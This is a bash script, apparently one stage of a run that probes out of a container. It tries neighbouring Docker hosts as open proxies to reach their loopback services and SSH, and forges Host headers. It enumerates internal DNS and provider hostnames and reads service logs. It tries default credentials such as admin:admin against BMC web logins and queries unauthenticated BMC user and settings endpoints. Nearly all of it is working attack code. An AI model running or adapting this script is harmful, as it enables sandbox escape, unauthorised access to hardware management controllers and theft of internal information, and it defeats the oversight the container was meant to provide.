#!/bin/bash
set +e
echo "###P14START $(date -u)"
echo "=== SIB-8080-AS-PROXY ==="
for h in 172.17.0.3 172.17.0.4 172.17.0.7; do
  echo "--- $h CONNECT to 127.0.0.1:31825"; timeout 10 curl -s -m 8 -p -x http://$h:8080 -o /tmp/x.$$ -w "c=%{http_code} l=%{size_download}\n" "http://127.0.0.1:31825/api/status" 2>&1 | tail -2; head -c 150 /tmp/x.$$ 2>/dev/null; echo
  echo "--- $h forward to 127.0.0.1:1301"; timeout 10 curl -s -m 8 -x http://$h:8080 -o /tmp/y.$$ -w "c=%{http_code} l=%{size_download}\n" "http://127.0.0.1:1301/" 2>&1 | tail -2; head -c 120 /tmp/y.$$ 2>/dev/null; echo
  echo "--- $h as http proxy to own 22 (banner)"; python3 - "$h" <<'PY'
import socket,sys
h=sys.argv[1]
try:
    s=socket.create_connection((h,8080),timeout=4); s.settimeout(5)
    s.sendall(b"CONNECT 127.0.0.1:22 HTTP/1.1\r\nHost: x\r\n\r\n")
    b=s.recv(200); print(repr(b[:120])); s.close()
except Exception as e: print("err",type(e).__name__)
PY
done
echo "=== SIB-8080-HOSTHDR ==="
for h in 172.17.0.3 172.17.0.7; do echo "--- $h Host: localhost /api/status"; curl -s -m 5 -H "Host: localhost" -o /tmp/z.$$ -w "c=%{http_code} l=%{size_download}\n" "http://$h:8080/api/status"; head -c 120 /tmp/z.$$; echo; done
echo "=== INTERNAL-DNS ==="; grep -a nameserver /etc/resolv.conf; cat /etc/resolv.conf | head -8; for n in ftpmaster.internal api.onethingai.com proxy-ai.onethingai.com stor.esinidc.com; do printf "%s -> " "$n"; getent hosts "$n" | head -1; done
echo "=== JUPYTER-LOG ==="; tail -c 1200 /var/log/supervisor/jupyterlab-stderr*.log 2>/dev/null | tail -12
echo "=== SSHD-LOG ==="; cat /var/log/supervisor/sshd-stdout*.log 2>/dev/null | tail -10
echo "=== PANLOG ==="; tail -c 800 /var/log/pan_client/pan_client-*.log 2>/dev/null | tail -12
echo "=== BMC-RPC ==="
for h in 192.168.2.92 192.168.2.93 192.168.2.181; do
  for c in admin:admin root:superuser; do u=${c%%:*}; p=${c##*:}
    r=$(curl -sk -m 8 -o /tmp/bm.$$ -w "%{http_code}" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "WEBVAR_USERNAME=$u&WEBVAR_PASSWORD=$p" "https://$h/rpc/WEBSES/create.asp" 2>/dev/null)
    echo "$h $u -> c=$r $(head -c 120 /tmp/bm.$$ | tr '\n' ' ')"
  done
done
echo "=== BMC-UNAUTH ==="; for h in 192.168.2.92 192.168.2.93 192.168.2.181; do echo "--- $h"; curl -sk -m 6 "https://$h/rpc/WEBSES/getallusers.asp" 2>/dev/null | head -c 200; echo; curl -sk -m 6 "https://$h/api/settings" 2>/dev/null | head -c 150; echo; done
echo "###P14END $(date -u)"
